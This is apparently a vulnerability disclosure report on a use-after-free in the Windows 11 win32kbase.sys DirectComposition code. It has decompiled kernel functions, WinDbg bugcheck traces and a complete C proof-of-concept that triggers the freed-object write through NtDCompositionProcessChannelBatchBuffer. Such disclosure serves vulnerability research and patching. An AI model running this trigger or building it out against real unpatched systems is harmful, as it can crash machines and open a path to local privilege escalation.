# Windows Win32k UAF本地提权漏洞

## Summary of vulnerability

Windows Win32k Elevation of Privilege Vulnerability <br>

## Product version

Windows 11 , Chinese-Simplified, Build 10.0.22000.739<br>
BuildLabEx   :    22000.1.amd64fre.co_release.210604-1628<br>
win32kbase.sys : 6.2.22000.708<br>

## Vulnerability describes

The vulnerability exists in file win32kbase.sys.<br>
The vulnerability occurs in functions :<br>

```
win32kbase!DirectComposition::CExpressionMarshaler::SetReferenceArrayProperty
win32kbase!DirectComposition::CAnimationLoggingManagerMarshaler::SetFloatProperty
win32kbase!DirectComposition::CExpressionMarshaler::ReleaseAllReferences
```

This is a UAF vulnerability.<br>
We can call function DirectComposition::CExpressionMarshaler::SetReferenceArrayProperty and take a CAnimationLoggingManagerMarshaler Obeject as an argument, and function DirectComposition::CExpressionMarshaler::SetReferenceArrayProperty will call function DirectComposition::CApplicationChannel::GetWeakReferenceBase to assign the CAnimationLoggingManagerMarshaler Obeject to WeakReferenceArrayItem.<br>

```
__int64 __fastcall DirectComposition::CApplicationChannel::GetWeakReferenceBase(DirectComposition::CApplicationChannel *this, CAnimationLoggingManagerMarshaler *userbuffer_item, struct DirectComposition::CWeakReferenceBase **WeakReferenceArrayItemTmp)
{
  unsigned int v3; // edi
  PVOID v7; // rdi
  WeakReferenceArrayItem *WeakReferenceArrayItem; // rbx
  PVOID v10; // rax
  int v11; // ecx
  __int64 v12; // rax
  CAnimationLoggingManagerMarshaler *Buffer; // [rsp+20h] [rbp-B8h] BYREF
  WeakReferenceArrayItem *v14; // [rsp+28h] [rbp-B0h]
  PVOID BackTrace[20]; // [rsp+30h] [rbp-A8h] BYREF

  v3 = 0;
  if ( (userbuffer_item->UafFlag & 4) == 0 )
  {
    v7 = gpLeakTrackingAllocator;
    if ( (*(gpLeakTrackingAllocator + 10) & 'rwCD') == 'rwCD' && (v12 = 0i64, *(gpLeakTrackingAllocator + 11)) )
    {
      while ( *(gpLeakTrackingAllocator + v12) != 'rwCD' )
      {
        if ( ++v12 >= *(gpLeakTrackingAllocator + 11) )
          goto LABEL_3;
      }
      WeakReferenceArrayItem = ExAllocatePool2(261i64, 0x28i64);
      if ( !WeakReferenceArrayItem )
        goto LABEL_20;
      memset(BackTrace, 0, sizeof(BackTrace));
      RtlCaptureStackBackTrace(0, 0x14u, BackTrace, 0i64);
      if ( (WeakReferenceArrayItem & 0xFFF) + 16 >= 0x1000 )
      {
        if ( !NSInstrumentation::CLeakTrackingAllocator::AssociateAllocationWithBacktrace<0>(
                v7,
                WeakReferenceArrayItem,
                BackTrace) )
        {
LABEL_19:
          ExFreePoolWithTag(WeakReferenceArrayItem, 0);
          goto LABEL_20;
        }
LABEL_5:
        WeakReferenceArrayItem->userbuffer_item = userbuffer_item;
        WeakReferenceArrayItem->WeakReferenceArrayItem_RefNum = 1;
        Buffer = userbuffer_item;
        v14 = WeakReferenceArrayItem;
        if ( RtlInsertElementGenericTable((this + 0x108), &Buffer, 0x10u, 0i64) )
        {
          v3 = 0;
          userbuffer_item->UafFlag |= 4u;
LABEL_7:
          *WeakReferenceArrayItemTmp = WeakReferenceArrayItem;// assign the CAnimationLoggingManagerMarshaler Obeject to WeakReferenceArrayItem
          return v3;
        }
```

So object CAnimationLoggingManagerMarshaler  has a reference to both object CAnimationLoggingManagerMarshaler  and object CExpressionMarshaler.<br>
Then call function DirectComposition::CApplicationChannel::ReleaseResource to release CAnimationLoggingManagerMarshaler Obeject.<br>
This function DirectComposition::CApplicationChannel::ReleaseResource will check the value of CAnimationLoggingManagerMarshaler->UafFlag, if it passes, will empty the object CAnimationLoggingManagerMarshaler's reference in object CExpressionMarshaler.<br>

```
__int64 __fastcall DirectComposition::CApplicationChannel::ReleaseResource(DirectComposition::CApplicationChannel *this, CAnimationLoggingManagerMarshaler *a2)
{
  unsigned int v2; // esi
  CAnimationLoggingManagerMarshaler *v3; // rbx
  int v6; // eax
  char v7; // al
  __int64 v8; // rax
  __int64 v9; // rax
  WeakReferenceArrayItem *v10; // rax
  size_t v11; // r8
  __int64 v12; // rcx
  int v13; // eax
  __int64 *v14; // rax
  __int64 v15; // rcx
  __int64 **v16; // rdx
  _QWORD *i; // rdx
  __int64 Src; // [rsp+38h] [rbp+10h] BYREF

  v2 = 0;
  v3 = a2;
  if ( a2 )
  {
    v2 = --a2->field_14;
    if ( v2 == 1 )
    {
      if ( (*(a2->field_0 + 24))(a2) )
        DirectComposition::CResourceMarshaler::ReturnResourceLifetimeTag(v3, (this + 472));
    }
    else if ( !v2 )
    {
      if ( a2->field_30 )
      {
        v11 = *(this + 63);
        Src = a2->field_30;
        memmove((*(this + 59) + v11 * ((*(this + 129) + *(this + 128)) % *(this + 62))), &Src, v11);
        ++*(this + 129);
        --*(this + 130);
        v3->field_30 = 0i64;
      }
      if ( (v3->UafFlag & 4) != 0 )             // Dissatisfy the condition
      {
        v10 = DirectComposition::CGenericTable<DirectComposition::CResourceMarshaler *,DirectComposition::CWeakReferenceBase,1953973060,1>::RemoveObject((this + 0x108));
        v3->UafFlag &= 0xFFFFFFFB;
        v10->userbuffer_item = 0i64;            // null
      }
```

We can make this test fail by calling function DirectComposition::CAnimationLoggingManagerMarshaler::SetFloatProperty.<br>

```
__int64 __fastcall DirectComposition::CAnimationLoggingManagerMarshaler::SetFloatProperty(CAnimationLoggingManagerMarshaler *this, unsigned int a2, float a3, bool *a4)
{
  __int64 result; // rax

  result = 0i64;
  *a4 = 0;
  if ( a2 != 4 )
    return DirectComposition::CResourceMarshaler::SetFloatProperty(this, a2, a3, a4);
  if ( a3 != 0.0 && (a3 < 0.0625 || a3 > 16.0) )
    return 3221225485i64;
  if ( *&this->UafValue != a3 )
  {
    this->UafFlag &= 0xFFFFFFFB;                // Set the UafFlag
    *&this->UafValue = a3;
    *a4 = 1;
  }
  return result;
}
```

So if we call DirectComposition::CAnimationLoggingManagerMarshaler::SetFloatProperty before calling DirectComposition::CApplicationChannel::ReleaseResource, Object CAnimationLoggingManagerMarshaler will be freed, but there will still be a reference to  Object CAnimationLoggingManagerMarshaler in Object CExpressionMarshaler.<br>
Finally, when the DirectComposition::CExpressionMarshaler::ReleaseAllReferences function is called, the value from the freed Object CAnimationLoggingManagerMarshaler is used.<br>
DirectComposition::CExpressionMarshaler::ReleaseAllReferences->DirectComposition::CApplicationChannel::ReleaseWeakReference:<br>

```
void __fastcall DirectComposition::CApplicationChannel::ReleaseWeakReference(DirectComposition::CApplicationChannel *this, WeakReferenceArrayItem *a2)
{
  bool v2; // zf
  CAnimationLoggingManagerMarshaler *v4; // rbx

  v2 = a2->WeakReferenceArrayItem_RefNum-- == 1;
  v4 = a2->userbuffer_item;
  if ( v2 )
  {
    NSInstrumentation::CLeakTrackingAllocator::Free(gpLeakTrackingAllocator, a2);
    if ( v4 )
    {
      DirectComposition::CGenericTable<DirectComposition::CResourceMarshaler *,DirectComposition::CWeakReferenceBase,1953973060,1>::RemoveObject((this + 0x108));
      v4->UafFlag &= 0xFFFFFFFB;                // UAf write
    }
  }
}
```

## Windbg stack trace

Enable Special pool:<br>

```
*******************************************************************************
*                                                                             *
*                        Bugcheck Analysis                                    *
*                                                                             *
*******************************************************************************

PAGE_FAULT_IN_NONPAGED_AREA (50)
Invalid system memory was referenced.  This cannot be protected by try-except.
Typically the address is just plain bad or it is pointing at freed memory.
Arguments:
Arg1: fffff6950dbf6f00, memory referenced.
Arg2: 0000000000000002, value 0 = read operation, 1 = write operation.
Arg3: fffff6d0cf1e5c87, If non-zero, the instruction address which referenced the bad memory
	address.
Arg4: 0000000000000000, (reserved)

Debugging Details:
------------------

*** WARNING: Unable to verify checksum for poc.exe

KEY_VALUES_STRING: 1

    Key  : Analysis.CPU.mSec
    Value: 2077

    Key  : Analysis.DebugAnalysisManager
    Value: Create

    Key  : Analysis.Elapsed.mSec
    Value: 11184

    Key  : Analysis.Init.CPU.mSec
    Value: 3108

    Key  : Analysis.Init.Elapsed.mSec
    Value: 197340

    Key  : Analysis.Memory.CommitPeak.Mb
    Value: 78

    Key  : WER.OS.Branch
    Value: co_release

    Key  : WER.OS.Timestamp
    Value: 2021-06-04T16:28:00Z

    Key  : WER.OS.Version
    Value: 10.0.22000.1


BUGCHECK_CODE:  50

BUGCHECK_P1: fffff6950dbf6f00

BUGCHECK_P2: 2

BUGCHECK_P3: fffff6d0cf1e5c87

BUGCHECK_P4: 0

READ_ADDRESS:  fffff6950dbf6f00 Special pool

LEGACY_PAGE_TABLE_ACCESS: 1

MM_INTERNAL_CODE:  0

IMAGE_NAME:  win32kbase.sys

MODULE_NAME: win32kbase

FAULTING_MODULE: fffff6d0cf140000 win32kbase

PROCESS_NAME:  poc.exe

TRAP_FRAME:  ffffc982a02570b0 -- (.trap 0xffffc982a02570b0)
NOTE: The trap frame does not contain all registers.
Some register values may be zeroed or incorrect.
rax=fffff6951165cfe0 rbx=0000000000000000 rcx=ffff9789dba970c0
rdx=0000000000000000 rsi=0000000000000000 rdi=0000000000000000
rip=fffff6d0cf1e5c87 rsp=ffffc982a0257240 rbp=fffff695116f68e0
 r8=0000000000000000  r9=000000000000003f r10=fffff695004001a0
r11=fffff69511d00dc0 r12=0000000000000000 r13=0000000000000000
r14=0000000000000000 r15=0000000000000000
iopl=0         nv up ei ng nz na po nc
win32kbase!DirectComposition::CApplicationChannel::ReleaseWeakReference+0x37:
fffff6d0`cf1e5c87 836310fb        and     dword ptr [rbx+10h],0FFFFFFFBh ds:00000000`00000010=????????
Resetting default scope

STACK_TEXT:  
ffffc982`a02565f8 fffff805`59b70642     : ffffc982`a0256760 fffff805`5991a3b0 fffff805`58c97180 00000000`00000000 : nt!DbgBreakPointWithStatus
ffffc982`a0256600 fffff805`59b6fe81     : fffff805`00000003 ffffc982`a0256760 fffff805`59a3a510 ffffc982`a0256d10 : nt!KiBugCheckDebugBreak+0x12
ffffc982`a0256660 fffff805`59a24957     : 00000000`00000000 00000000`00000000 00015966`00000000 fffff695`0dbf6f00 : nt!KeBugCheck2+0xa71
ffffc982`a0256dd0 fffff805`59aec26f     : 00000000`00000050 fffff695`0dbf6f00 00000000`00000002 ffffc982`a02570b0 : nt!KeBugCheckEx+0x107
ffffc982`a0256e10 fffff805`59886436     : 00000000`00000000 00000000`00000002 ffffc982`a0257010 00000000`00000000 : nt!MiSystemFault+0x19b5bf
ffffc982`a0256f10 fffff805`59a334f5     : ffff9789`d4c5fcc0 fffff805`5a077929 00000000`00000001 00000000`00000000 : nt!MmAccessFault+0x2a6
ffffc982`a02570b0 fffff6d0`cf1e5c87     : fffff695`0dbf6ef0 fffff695`1165cfe0 fffff695`0dbf6ef0 00000000`00000000 : nt!KiPageFault+0x335
ffffc982`a0257240 fffff6d0`cf1e5b43     : fffff695`0c644f20 00000000`00000000 ffff9789`00000009 ffff9789`00000000 : win32kbase!DirectComposition::CApplicationChannel::ReleaseWeakReference+0x37
ffffc982`a0257270 fffff6d0`cf19271c     : fffff695`0c644f20 00000000`00000000 00000000`00000000 ffff9789`00000000 : win32kbase!DirectComposition::CExpressionMarshaler::ReleaseAllReferences+0x43
ffffc982`a02572a0 fffff6d0`cf192542     : 00000000`00000000 fffff805`59b8e2ff fffff802`231a0008 00000000`00000000 : win32kbase!DirectComposition::CApplicationChannel::ReleaseResource+0x11c
ffffc982`a02572d0 fffff6d0`cf191276     : 00000000`00000000 ffffc982`a0257520 fffff802`231a0008 00000000`00000000 : win32kbase!DirectComposition::CApplicationChannel::ReleaseResource+0x82
ffffc982`a0257310 fffff6d0`cf190c98     : fffff695`116f68e0 fffff802`231a0008 ffff9789`00000000 fffff3f9`fcefff01 : win32kbase!DirectComposition::CApplicationChannel::ProcessCommandBufferIterator+0x532
ffffc982`a02573d0 fffff6d0`ce3afe6a     : 00000000`00000031 00000000`00000008 000000cc`70ddf704 000000cc`70ddf700 : win32kbase!NtDCompositionProcessChannelBatchBuffer+0x168
ffffc982`a0257460 fffff805`59a36e75     : ffff9789`dba970c0 5364925c`10420000 00000000`00000000 ffff9789`00000000 : win32k!NtDCompositionProcessChannelBatchBuffer+0x16
ffffc982`a02574a0 00007ff8`605d39f4     : 00007ff6`3a24132f 00007ff6`3a2433e8 00000000`c000000d 000000cc`70ddf6c8 : nt!KiSystemServiceCopyEnd+0x25
000000cc`70ddf6c8 00007ff6`3a24132f     : 00007ff6`3a2433e8 00000000`c000000d 000000cc`70ddf6c8 00000000`00000000 : win32u!NtDCompositionProcessChannelBatchBuffer+0x14
000000cc`70ddf6d0 00007ff6`3a2433e8     : 00000000`c000000d 000000cc`70ddf6c8 00000000`00000000 00000241`3fad0000 : poc+0x132f
000000cc`70ddf6d8 00000000`c000000d     : 000000cc`70ddf6c8 00000000`00000000 00000241`3fad0000 00007ff6`00000040 : poc+0x33e8
000000cc`70ddf6e0 000000cc`70ddf6c8     : 00000000`00000000 00000241`3fad0000 00007ff6`00000040 00000001`00000000 : 0xc000000d
000000cc`70ddf6e8 00000000`00000000     : 00000241`3fad0000 00007ff6`00000040 00000001`00000000 00000000`00004000 : 0x000000cc`70ddf6c8


SYMBOL_NAME:  win32kbase!DirectComposition::CApplicationChannel::ReleaseWeakReference+37

IMAGE_VERSION:  10.0.22000.708

STACK_COMMAND:  .thread ; .cxr ; kb

BUCKET_ID_FUNC_OFFSET:  37

FAILURE_BUCKET_ID:  AV_VRF_INVALID_win32kbase!DirectComposition::CApplicationChannel::ReleaseWeakReference

OS_VERSION:  10.0.22000.1

BUILDLAB_STR:  co_release

OSPLATFORM_TYPE:  x64

OSNAME:  Windows 10

FAILURE_ID_HASH:  {4acca38f-a7df-f761-774c-55925873910d}

Followup:     MachineOwner
---------
```

Without Special pool:

```
1: kd> p
win32kbase!DirectComposition::CApplicationChannel::ReleaseWeakReference+0x37:
ffffce86`c68a5c87 836310fb        and     dword ptr [rbx+10h],0FFFFFFFBh
1: kd> !pool rbx
Pool page ffffcecb80a9e250 region is Paged session pool
 ffffcecb80a9e000 size:  120 previous size:    0  (Allocated)  DClm Process: ffff8887c2573080
 ffffcecb80a9e120 size:  120 previous size:    0  (Allocated)  DClm Process: ffff8887c32e90c0
*ffffcecb80a9e240 size:  120 previous size:    0  (Free)      *DClm
		Pooltag DClm : DCOMPOSITIONTAG_ANIMATIONLOGGINGMANAGERMARSHALER, Binary : win32kbase!DirectComposition::C
 ffffcecb80a9e360 size:  120 previous size:    0  (Allocated)  DClm Process: ffff8887c2573080
 ffffcecb80a9e480 size:  120 previous size:    0  (Allocated)  DClm Process: ffff8887c2573080
 ffffcecb80a9e5a0 size:  120 previous size:    0  (Allocated)  DClm Process: ffff8887c2cc60c0
 ffffcecb80a9e6c0 size:  120 previous size:    0  (Allocated)  DClm Process: ffff8887c2573080
 ffffcecb80a9e7e0 size:  120 previous size:    0  (Allocated)  DClm Process: ffff8887c2cc60c0
 ffffcecb80a9e900 size:  120 previous size:    0  (Allocated)  DClm Process: ffff8887c2573080
 ffffcecb80a9ea20 size:  120 previous size:    0  (Allocated)  DClm Process: ffff8887c2573080
 ffffcecb80a9eb40 size:  120 previous size:    0  (Allocated)  DClm Process: ffff8887c2573080
 ffffcecb80a9ec60 size:  120 previous size:    0  (Allocated)  DClm Process: ffff8887c32e90c0
 ffffcecb80a9ed80 size:  120 previous size:    0  (Allocated)  DClm Process: ffff8887c2573080
 ffffcecb80a9eea0 size:  120 previous size:    0  (Allocated)  DClm Process: ffff8887c32e90c0
1: kd> kv
 # Child-SP          RetAddr               : Args to Child                                                           : Call Site
00 fffffc0e`8aec7240 ffffce86`c68a5b43     : ffffcecb`80c347b0 00000000`00000000 00000000`00000000 00000000`00000000 : win32kbase!DirectComposition::CApplicationChannel::ReleaseWeakReference+0x37
01 fffffc0e`8aec7270 ffffce86`c685271c     : ffffcecb`80c347b0 00000000`00000000 00000000`00000000 fffff802`3102a5ce : win32kbase!DirectComposition::CExpressionMarshaler::ReleaseAllReferences+0x43
02 fffffc0e`8aec72a0 ffffce86`c6852542     : 00000000`00000000 00007ffd`5a308630 fffff802`71710008 fffffc0e`8aec74a0 : win32kbase!DirectComposition::CApplicationChannel::ReleaseResource+0x11c
03 fffffc0e`8aec72d0 ffffce86`c6851276     : 00000000`00000000 fffffc0e`8aec7520 fffff802`71710008 00000000`00000000 : win32kbase!DirectComposition::CApplicationChannel::ReleaseResource+0x82
04 fffffc0e`8aec7310 ffffce86`c6850c98     : ffffcecb`82272670 fffff802`71710008 00000000`00000000 ffff8887`c3098201 : win32kbase!DirectComposition::CApplicationChannel::ProcessCommandBufferIterator+0x532
05 fffffc0e`8aec73d0 ffffce86`c757fe6a     : 00000000`00000000 00000000`00000008 000000a5`2d2ff8b4 000000a5`2d2ff8b0 : win32kbase!NtDCompositionProcessChannelBatchBuffer+0x168
06 fffffc0e`8aec7460 fffff802`31029e75     : ffff8887`c37ad080 a63e6731`28950000 00000000`00000000 ffff8887`00000000 : win32k!NtDCompositionProcessChannelBatchBuffer+0x16
07 fffffc0e`8aec74a0 00007ffd`58cf39f4     : 00007ff6`19fb1335 00007ff6`19fb33e8 00000000`c000000d 000000a5`2d2ff878 : nt!KiSystemServiceCopyEnd+0x25 (TrapFrame @ fffffc0e`8aec74a0)
08 000000a5`2d2ff878 00007ff6`19fb1335     : 00007ff6`19fb33e8 00000000`c000000d 000000a5`2d2ff878 00000000`00000000 : 0x00007ffd`58cf39f4
09 000000a5`2d2ff880 00007ff6`19fb33e8     : 00000000`c000000d 000000a5`2d2ff878 00000000`00000000 00000276`33940000 : 0x00007ff6`19fb1335
0a 000000a5`2d2ff888 00000000`c000000d     : 000000a5`2d2ff878 00000000`00000000 00000276`33940000 00007ff6`00000014 : 0x00007ff6`19fb33e8
0b 000000a5`2d2ff890 000000a5`2d2ff878     : 00000000`00000000 00000276`33940000 00007ff6`00000014 00000001`00000000 : 0xc000000d
0c 000000a5`2d2ff898 00000000`00000000     : 00000276`33940000 00007ff6`00000014 00000001`00000000 00000000`00004000 : 0x000000a5`2d2ff878
```

## Proof of Concept

```
#include <stdio.h>
#include <tchar.h>
#include <windows.h>
#include <winternl.h>
#include <strsafe.h>
#include <assert.h>
#include <conio.h>

#pragma warning(disable: 4311)
#pragma warning(disable: 4302)

enum DCPROCESSCOMMANDID
{
	nCmdProcessCommandBufferIterator,
	nCmdCreateResource,
	nCmdOpenSharedResource,
	nCmdReleaseResource,
	nCmdGetAnimationTime,
	nCmdCapturePointer,
	nCmdOpenSharedResourceHandle,
	nCmdSetResourceCallbackId,
	nCmdSetResourceIntegerProperty,
	nCmdSetResourceFloatProperty,
	nCmdSetResourceHandleProperty,
	nCmdSetResourceHandleArrayProperty,
	nCmdSetResourceBufferProperty,
	nCmdSetResourceReferenceProperty,
	nCmdSetResourceReferenceArrayProperty,
	nCmdSetResourceAnimationProperty,
	nCmdSetResourceDeletedNotificationTag,
	nCmdAddVisualChild,
	nCmdRedirectMouseToHwnd,
	nCmdSetVisualInputSink,
	nCmdRemoveVisualChild
};

typedef
NTSTATUS
(NTAPI* _NtDCompositionCreateChannel)(
	OUT PHANDLE pArgChannelHandle,
	IN OUT PSIZE_T pArgSectionSize,
	OUT PVOID* pArgSectionBaseMapInProcess
	);

typedef
NTSTATUS
(NTAPI* _NtDCompositionDestroyChannel)(
	IN HANDLE ChannelHandle
	);


typedef
NTSTATUS
(NTAPI* _NtDCompositionProcessChannelBatchBuffer)(
	IN HANDLE hChannel,
	IN DWORD dwArgStart,
	OUT PDWORD pOutArg1,
	OUT PDWORD pOutArg2);

typedef
NTSTATUS
(NTAPI* _NtDCompositionCommitChannel)(
	IN HANDLE hChannel,
	OUT PDWORD pOutArg1,
	OUT PDWORD pOutArg2,
	IN DWORD flag,
	IN HANDLE Object);

typedef
NTSTATUS
(NTAPI* _NtDCompositionCreateSynchronizationObject)(
	void** a1
	);

_NtDCompositionCreateChannel NtDCompositionCreateChannel;
_NtDCompositionDestroyChannel NtDCompositionDestroyChannel;
_NtDCompositionProcessChannelBatchBuffer NtDCompositionProcessChannelBatchBuffer;
_NtDCompositionCommitChannel NtDCompositionCommitChannel;
_NtDCompositionCreateSynchronizationObject NtDCompositionCreateSynchronizationObject;

int main(int argc, TCHAR* argv[])
{
	HANDLE hChannel;
	NTSTATUS ntStatus;
	PVOID pMappedAddress = NULL;  SIZE_T SectionSize = 0x4000;
	DWORD dwArg1, dwArg2;
	DWORD hResource = 1;

	LoadLibrary(TEXT("user32"));
	NtDCompositionCreateChannel = (_NtDCompositionCreateChannel)GetProcAddress(LoadLibrary(L"win32u.dll"), "NtDCompositionCreateChannel");
	NtDCompositionDestroyChannel = (_NtDCompositionDestroyChannel)GetProcAddress(LoadLibrary(L"win32u.dll"), "NtDCompositionDestroyChannel");
	NtDCompositionProcessChannelBatchBuffer = (_NtDCompositionProcessChannelBatchBuffer)GetProcAddress(LoadLibrary(L"win32u.dll"), "NtDCompositionProcessChannelBatchBuffer");
	NtDCompositionCommitChannel = (_NtDCompositionCommitChannel)GetProcAddress(LoadLibrary(L"win32u.dll"), "NtDCompositionCommitChannel");
	NtDCompositionCreateSynchronizationObject = (_NtDCompositionCreateSynchronizationObject)GetProcAddress(LoadLibrary(L"win32u.dll"), "NtDCompositionCreateSynchronizationObject");

	ntStatus = NtDCompositionCreateChannel(&hChannel, &SectionSize, &pMappedAddress);
	if (!NT_SUCCESS(ntStatus)) {
		printf("[*] Create channel error code:0x%08x \n", ntStatus);
		exit(-1);
	}

	printf("[*] Create channel1 ok, channel number: 0x%x \n", (unsigned long)hChannel);

	*(DWORD*)(pMappedAddress) = nCmdCreateResource;
	*(DWORD*)((PUCHAR)pMappedAddress + 4) = 1;
	*(DWORD*)((PUCHAR)pMappedAddress + 8) = 0x3;//DirectComposition::CAnimationLoggingManagerMarshaler
	*(DWORD*)((PUCHAR)pMappedAddress + 0xC) = FALSE;
	ntStatus = NtDCompositionProcessChannelBatchBuffer(hChannel, 0x10, &dwArg1, &dwArg2);
	printf("[*] CreateResource ntStatus %x \n", ntStatus);

	*(DWORD*)(pMappedAddress) = nCmdCreateResource;
	*(DWORD*)((PUCHAR)pMappedAddress + 4) = 2;
	*(DWORD*)((PUCHAR)pMappedAddress + 8) = 0x3A;//DirectComposition::CExpressionMarshaler
	*(DWORD*)((PUCHAR)pMappedAddress + 0xC) = FALSE;
	ntStatus = NtDCompositionProcessChannelBatchBuffer(hChannel, 0x10, &dwArg1, &dwArg2);
	printf("[*] CreateResource ntStatus %x \n", ntStatus);

	long long ReferenceId = 1;
	*(DWORD*)(pMappedAddress) = nCmdSetResourceReferenceArrayProperty;
	*(DWORD*)((PUCHAR)pMappedAddress + 4) = 2;
	*(DWORD*)((PUCHAR)pMappedAddress + 8) = 0x14;
	*(DWORD*)((PUCHAR)pMappedAddress + 0xC) = 1;
	CopyMemory((PUCHAR)pMappedAddress + 0x10, &ReferenceId, sizeof(ReferenceId));
	ntStatus = NtDCompositionProcessChannelBatchBuffer(hChannel, 0x10 + sizeof(ReferenceId), &dwArg1, &dwArg2);
	printf("[*] SetResourceReferenceArrayProperty ntStatus %x \n", ntStatus);


	*(DWORD*)(pMappedAddress) = nCmdSetResourceFloatProperty;
	*(DWORD*)((PUCHAR)pMappedAddress + 4) = 1;
	*(DWORD*)((PUCHAR)pMappedAddress + 8) = 4;
	*(DWORD*)((PUCHAR)pMappedAddress + 0xc) = 0;
	NtDCompositionProcessChannelBatchBuffer(hChannel, 0x10, &dwArg1, &dwArg2);
	printf("[*] SetResourceFloatProperty ntStatus %x \n", ntStatus);

	*(DWORD*)(pMappedAddress) = nCmdReleaseResource;
	*(DWORD*)((PUCHAR)pMappedAddress + 4) = 1;
	NtDCompositionProcessChannelBatchBuffer(hChannel, 0x8, &dwArg1, &dwArg2);
	printf("[*] SetResourceFloatProperty ntStatus %x \n", ntStatus);

	*(DWORD*)(pMappedAddress) = nCmdReleaseResource;
	*(DWORD*)((PUCHAR)pMappedAddress + 4) = 2;
	NtDCompositionProcessChannelBatchBuffer(hChannel, 0x8, &dwArg1, &dwArg2);
	printf("[*] SetResourceFloatProperty ntStatus %x \n", ntStatus);

	return 0;
}
```